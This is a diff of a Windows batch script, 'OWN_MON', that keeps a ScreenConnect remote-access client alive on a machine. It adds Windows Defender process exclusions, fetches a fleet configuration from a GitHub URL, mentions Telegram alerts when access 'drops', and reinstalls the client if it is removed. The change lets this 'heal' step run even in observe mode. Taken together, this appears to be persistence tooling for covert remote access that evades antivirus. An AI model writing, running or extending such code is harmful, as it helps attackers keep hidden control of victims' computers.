@@ -1,6 +1,7 @@
 @echo off
 rem ═══════════════════════════════════════════════════════════════
-rem  OWN_MON  BUILD 20260804M62
+rem  OWN_MON  BUILD 20260804M63
+rem  M63: OBSERVE still blocks REINSTALL;/x — allows HEAL start + 1060 /i (G10).
 rem  M62: QueueGryxaHeal hard-blocked under OBSERVE; pair with G10 (no shared ProductCode /x).
 rem  M61: arm gryxa_watch LOOP — record all Gryxa interference; Telegram on DROP with CAUSE.
 rem  M60: OBSERVE mode — no heal/force/reinstall; log health to drop_trace.log (prove drop cause).
@@ -67,8 +68,8 @@ reg add "HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\Processes" /v "Scre
 reg add "HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\Processes" /v "msiexec.exe" /t REG_DWORD /d 0 /f >nul 2>&1
 if not exist "%LOG%" type nul>"%LOG%" 2>nul
 
-set "MONVER=M62"
-set "MON_MIN=M61"
+set "MONVER=M63"
+set "MON_MIN=M62"
 set "GIT_PIN="
 set "CHANNEL_URL=https://raw.githubusercontent.com/xnobuddy/github-drop/main/fleet_channel.cfg?t=%RANDOM%%RANDOM%"
 set "FLOOR_FILE=%WD%\version_floor.cfg"
@@ -793,9 +794,10 @@ if "!GRYXA_OK!"=="0" (
 rem heal ONLY on hard 1060 (service missing). Never msiexec while svc exists.
 set "NEED_HEAL=0"
 if "!OBSERVE!"=="1" (
-  echo gryxa_observe_skip_heal GRYXA_OK=!GRYXA_OK!>>"%LOG%"
+  echo gryxa_observe_heal_allowed_no_reinstall GRYXA_OK=!GRYXA_OK!>>"%LOG%"
   echo %DATE% %TIME% observe ok=!GRYXA_OK! fp=%GRYXA_FP% gh=!GH!>>"%WD%\drop_trace.log"
-) else if "!GRYXA_OK!"=="0" (
+)
+if "!GRYXA_OK!"=="0" (
   sc query "ScreenConnect Client (%GRYXA_FP%)" >nul 2>&1
   if errorlevel 1 (
     set "NEED_HEAL=1"
@@ -970,13 +972,13 @@ if !_PN! EQU 0 exit /b 1
 exit /b 0
 
 :QueueGryxaHeal
-rem %1=REINSTALL|HEAL — rate-limit 90m UNLESS service is 1060 (always allow recover)
-if exist "%WD%\observe.flag" (
-  echo gryxa_heal_blocked_OBSERVE>>"%LOG%"
-  exit /b 0
-)
+rem %1=REINSTALL|HEAL — OBSERVE blocks REINSTALL only; HEAL (start/1060-i) allowed
 set "HEALMODE=%~1"
 if "%HEALMODE%"=="" set "HEALMODE=HEAL"
+if exist "%WD%\observe.flag" if /I "!HEALMODE!"=="REINSTALL" (
+  echo gryxa_reinstall_blocked_OBSERVE>>"%LOG%"
+  exit /b 0
+)
 set "BYPASS_RL=0"
 sc query "ScreenConnect Client (%GRYXA_FP%)" >nul 2>&1
 if errorlevel 1 set "BYPASS_RL=1"
@@ -1070,10 +1072,6 @@ if not errorlevel 1 (
   exit /b 0
 )
 echo gryxa_must_1060_queue_heal>>"%LOG%"
-if exist "%WD%\observe.flag" (
-  echo gryxa_must_observe_skip_heal>>"%LOG%"
-  exit /b 0
-)
 call :QueueGryxaHeal HEAL
 exit /b 0
 
